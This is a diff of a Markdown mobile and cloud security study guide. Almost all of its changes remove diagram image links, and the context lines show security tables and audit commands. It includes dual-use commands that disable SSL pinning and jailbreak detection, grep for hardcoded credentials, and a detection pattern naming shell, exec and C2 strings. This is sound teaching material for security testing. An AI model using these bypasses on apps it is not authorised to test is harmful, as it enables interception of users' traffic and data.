-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-diagram.svg" alt="Diagram: FORCEDENTRY Exploit Chain" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/forcedentry-exploit-chain-sticky.svg" alt="Sticky Note: FORCEDENTRY Exploit Chain" width="30%">
-</a>
 
 
 ```
@@ -1857,16 +1337,6 @@ Hide process (rootkit) -> Exfiltrate data
 
 ### iOS Security Mitigations
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-handwritten.svg" alt="Handwritten: iOS Security Mitigations" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-diagram.svg" alt="Diagram: iOS Security Mitigations" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-mitigations-sticky.svg" alt="Sticky Note: iOS Security Mitigations" width="30%">
-</a>
-
 
 | Mitigation | What It Prevents | How Pegasus Bypassed It |
 |------------|------------------|------------------------|
@@ -1878,16 +1348,6 @@ Hide process (rootkit) -> Exfiltrate data
 | JIT hardening | Code execution prevention | Used signed JIT regions |
 
 ### Comparison: iOS vs Android Security Models
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-handwritten.svg" alt="Handwritten: Comparison: iOS vs Android Security Models" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-diagram.svg" alt="Diagram: Comparison: iOS vs Android Security Models" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/comparison-ios-vs-android-security-models-sticky.svg" alt="Sticky Note: Comparison: iOS vs Android Security Models" width="30%">
-</a>
 
 
 | Security Feature | iOS | Android |
@@ -1907,16 +1367,6 @@ Hide process (rootkit) -> Exfiltrate data
 ## Mobile Security
 
 ### Android Security Model
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-handwritten.svg" alt="Handwritten: Android Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-diagram.svg" alt="Diagram: Android Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-security-model-sticky.svg" alt="Sticky Note: Android Security Model" width="30%">
-</a>
 
 
 **Analogy:** A building with individual apartments. Each app is an apartment with its own lock (per-app UID). Android SELinux is the building security guard — even if a tenant leaves their door open, the guard prevents them from entering other apartments.
@@ -1955,16 +1405,6 @@ adb shell dumpsys package com.example.app | grep permissions
 
 ### iOS Security Model
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-handwritten.svg" alt="Handwritten: iOS Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-diagram.svg" alt="Diagram: iOS Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-security-model-sticky.svg" alt="Sticky Note: iOS Security Model" width="30%">
-</a>
-
 
 **Analogy:** A gated community with a strict HOA (hardware-enforced security). The Secure Enclave is a separate security system for each house's safe. iMessage BlastDoor is a mailroom that inspects packages before delivery.
 
@@ -1992,16 +1432,6 @@ adb shell dumpsys package com.example.app | grep permissions
 
 ### A&D Table — Android vs iOS Security
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-handwritten.svg" alt="Handwritten: A&D Table — Android vs iOS Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-diagram.svg" alt="Diagram: A&D Table — Android vs iOS Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-android-vs-ios-security-sticky.svg" alt="Sticky Note: A&D Table — Android vs iOS Security" width="30%">
-</a>
-
 
 | Aspect | Android | iOS |
 |--------|---------|-----|
@@ -2014,16 +1444,6 @@ adb shell dumpsys package com.example.app | grep permissions
 | Jailbreak/Root | Root access via bootloader unlock | Jailbreak via software exploit only |
 
 ### Edge Cases — Mobile Security
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-handwritten.svg" alt="Handwritten: Edge Cases — Mobile Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-diagram.svg" alt="Diagram: Edge Cases — Mobile Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-mobile-security-sticky.svg" alt="Sticky Note: Edge Cases — Mobile Security" width="30%">
-</a>
 
 
 - **iOS 17+ - Lockdown Mode:** Applies maximum security settings. Disables most web technologies, limits messaging, blocks USB accessories.
@@ -2050,16 +1470,6 @@ adb shell dumpsys package com.example.app | grep permissions
 
 ### M1 — Improper Credential Usage
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-handwritten.svg" alt="Handwritten: M1 — Improper Credential Usage" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-diagram.svg" alt="Diagram: M1 — Improper Credential Usage" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m1-improper-credential-usage-sticky.svg" alt="Sticky Note: M1 — Improper Credential Usage" width="30%">
-</a>
-
 
 ```bash
 # Android - Detect hardcoded credentials (using jadx decompilation)
@@ -2071,16 +1481,6 @@ grep -r "password|secret|apikey" output_dir/ --include="*.java"
 ```
 
 ### M5 — Insecure Communication Detection
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-handwritten.svg" alt="Handwritten: M5 — Insecure Communication Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-diagram.svg" alt="Diagram: M5 — Insecure Communication Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m5-insecure-communication-detection-sticky.svg" alt="Sticky Note: M5 — Insecure Communication Detection" width="30%">
-</a>
 
 
 ```bash
@@ -2104,16 +1504,6 @@ ios sslpinning disable
 
 ### M7 — Insecure Data Storage Detection
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-handwritten.svg" alt="Handwritten: M7 — Insecure Data Storage Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-diagram.svg" alt="Diagram: M7 — Insecure Data Storage Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m7-insecure-data-storage-detection-sticky.svg" alt="Sticky Note: M7 — Insecure Data Storage Detection" width="30%">
-</a>
-
 
 ```bash
 # Android - Check for insecure data storage
@@ -2135,16 +1525,6 @@ find /data/data/com.example.app -name "*.db" -exec sqlite3 {} .dump \;
 
 ### M2 — Supply Chain Security
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-handwritten.svg" alt="Handwritten: M2 — Supply Chain Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-diagram.svg" alt="Diagram: M2 — Supply Chain Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/m2-supply-chain-security-sticky.svg" alt="Sticky Note: M2 — Supply Chain Security" width="30%">
-</a>
-
 
 ```bash
 # Scan Android app dependencies for known vulnerabilities
@@ -2160,16 +1540,6 @@ unzip -l app.apk | grep -E "\.jar|\.aar"
 ## Mobile App Security Testing
 
 ### Android APK Decompilation with jadx
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-handwritten.svg" alt="Handwritten: Android APK Decompilation with jadx" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-diagram.svg" alt="Diagram: Android APK Decompilation with jadx" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/android-apk-decompilation-with-jadx-sticky.svg" alt="Sticky Note: Android APK Decompilation with jadx" width="30%">
-</a>
 
 
 ```bash
@@ -2206,16 +1576,6 @@ Output: 5 security issues identified (2 HIGH, 2 MEDIUM, 1 LOW)
 
 ### iOS IPA Analysis with objection
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-handwritten.svg" alt="Handwritten: iOS IPA Analysis with objection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-diagram.svg" alt="Diagram: iOS IPA Analysis with objection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/ios-ipa-analysis-with-objection-sticky.svg" alt="Sticky Note: iOS IPA Analysis with objection" width="30%">
-</a>
-
 
 ```bash
 # Prerequisites: jailbroken iOS device or iOS runtime environment
@@ -2246,16 +1606,6 @@ ios jailbreak disable
 ```
 
 ### Mobile App Traffic Interception with Burp Suite
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-handwritten.svg" alt="Handwritten: Mobile App Traffic Interception with Burp Suite" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-diagram.svg" alt="Diagram: Mobile App Traffic Interception with Burp Suite" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-traffic-interception-with-burp-suite-sticky.svg" alt="Sticky Note: Mobile App Traffic Interception with Burp Suite" width="30%">
-</a>
 
 
 **Step-by-Step Setup:**
@@ -2317,16 +1667,6 @@ ios sslpinning disable
 
 ### MDM Architecture
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-handwritten.svg" alt="Handwritten: MDM Architecture" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-diagram.svg" alt="Diagram: MDM Architecture" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mdm-architecture-sticky.svg" alt="Sticky Note: MDM Architecture" width="30%">
-</a>
-
 
 **Analogy:** A company-issued car. The company decides what maintenance is done, where it can be parked, and what routes are allowed. The employee drives it for work but can also use it for limited personal trips.
 
@@ -2355,16 +1695,6 @@ ios sslpinning disable
 ```
 
 ### BYOD (Bring Your Own Device)
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-handwritten.svg" alt="Handwritten: BYOD (Bring Your Own Device)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-diagram.svg" alt="Diagram: BYOD (Bring Your Own Device)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/byod-bring-your-own-device-sticky.svg" alt="Sticky Note: BYOD (Bring Your Own Device)" width="30%">
-</a>
 
 
 **Analogy:** An employee bringing their personal car to deliver company packages. The company installs a GPS tracker (MDM agent) but only activates it during work hours. The rest of the time, the car is private.
@@ -2407,16 +1737,6 @@ adb shell am start -a android.action.DPM_CMD -e command create_work_profile
 
 ### A&D Table — BYOD Models
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-handwritten.svg" alt="Handwritten: A&D Table — BYOD Models" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-diagram.svg" alt="Diagram: A&D Table — BYOD Models" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-byod-models-sticky.svg" alt="Sticky Note: A&D Table — BYOD Models" width="30%">
-</a>
-
 
 | Model | User Privacy | Corporate Security | Complexity |
 |-------|-------------|-------------------|------------|
@@ -2432,16 +1752,6 @@ adb shell am start -a android.action.DPM_CMD -e command create_work_profile
 
 ### Types of Mobile Malware
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-handwritten.svg" alt="Handwritten: Types of Mobile Malware" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-diagram.svg" alt="Diagram: Types of Mobile Malware" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/types-of-mobile-malware-sticky.svg" alt="Sticky Note: Types of Mobile Malware" width="30%">
-</a>
-
 
 | Type | Description | Example | Distribution |
 |------|-------------|---------|--------------|
@@ -2454,16 +1764,6 @@ adb shell am start -a android.action.DPM_CMD -e command create_work_profile
 | RAT (Remote Access) | Full device control | Android/SpyNote | SMS phishing |
 
 ### Mobile Malware Analysis Methodology
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-handwritten.svg" alt="Handwritten: Mobile Malware Analysis Methodology" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-diagram.svg" alt="Diagram: Mobile Malware Analysis Methodology" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-malware-analysis-methodology-sticky.svg" alt="Sticky Note: Mobile Malware Analysis Methodology" width="30%">
-</a>
 
 
 **Step 1: Static Analysis**
@@ -2525,16 +1825,6 @@ tcpdump -r traffic.pcap -X
 
 ### Repackaging Detection
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-handwritten.svg" alt="Handwritten: Repackaging Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-diagram.svg" alt="Diagram: Repackaging Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/repackaging-detection-sticky.svg" alt="Sticky Note: Repackaging Detection" width="30%">
-</a>
-
 
 ```bash
 # Compare original vs repackaged APK
@@ -2553,16 +1843,6 @@ grep -r "http://|https://|\.onion|\.bit|C2|shell|exec|Runtime" decompiled/
 ```
 
 ### In-App Purchase / Billing Fraud
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-handwritten.svg" alt="Handwritten: In-App Purchase / Billing Fraud" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-diagram.svg" alt="Diagram: In-App Purchase / Billing Fraud" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/in-app-purchase-billing-fraud-sticky.svg" alt="Sticky Note: In-App Purchase / Billing Fraud" width="30%">
-</a>
 
 
 | Fraud Type | Description | Detection |
@@ -2620,16 +1900,6 @@ def validate_app_store_receipt(receipt_data, production=True):
 
 ### Cloud IAM Policy Analysis
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-handwritten.svg" alt="Handwritten: Cloud IAM Policy Analysis" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-diagram.svg" alt="Diagram: Cloud IAM Policy Analysis" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-iam-policy-analysis-sticky.svg" alt="Sticky Note: Cloud IAM Policy Analysis" width="30%">
-</a>
-
 
 ```bash
 # AWS IAM Access Analyzer - find over-permissive access
@@ -2653,16 +1923,6 @@ aws s3api get-bucket-policy --bucket my-bucket
 
 ### Docker Security Audit
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-handwritten.svg" alt="Handwritten: Docker Security Audit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-diagram.svg" alt="Diagram: Docker Security Audit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-audit-sticky.svg" alt="Sticky Note: Docker Security Audit" width="30%">
-</a>
-
 
 ```bash
 # Full docker-bench-security scan
@@ -2681,16 +1941,6 @@ docker images --quiet | xargs -L1 trivy image
 ```
 
 ### Kubernetes Security Commands
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-handwritten.svg" alt="Handwritten: Kubernetes Security Commands" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-diagram.svg" alt="Diagram: Kubernetes Security Commands" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-security-commands-sticky.svg" alt="Sticky Note: Kubernetes Security Commands" width="30%">
-</a>
 
 
 ```bash
@@ -2717,16 +1967,6 @@ kubectl get apiserver -o yaml | grep encryption
 
 ### Trivy Container Scanning
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-handwritten.svg" alt="Handwritten: Trivy Container Scanning" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-diagram.svg" alt="Diagram: Trivy Container Scanning" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-scanning-sticky.svg" alt="Sticky Note: Trivy Container Scanning" width="30%">
-</a>
-
 
 ```bash
 # Scan a single image
@@ -2743,16 +1983,6 @@ trivy filesystem --severity HIGH /var/lib/docker
 ```
 
 ### Falco Runtime Detection
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-handwritten.svg" alt="Handwritten: Falco Runtime Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-diagram.svg" alt="Diagram: Falco Runtime Detection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-detection-sticky.svg" alt="Sticky Note: Falco Runtime Detection" width="30%">
-</a>
 
 
 ```bash
@@ -2771,16 +2001,6 @@ journalctl -u falco -n 50
 ```
 
 ### Mobile App Commands
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-handwritten.svg" alt="Handwritten: Mobile App Commands" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-diagram.svg" alt="Diagram: Mobile App Commands" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-commands-sticky.svg" alt="Sticky Note: Mobile App Commands" width="30%">
-</a>
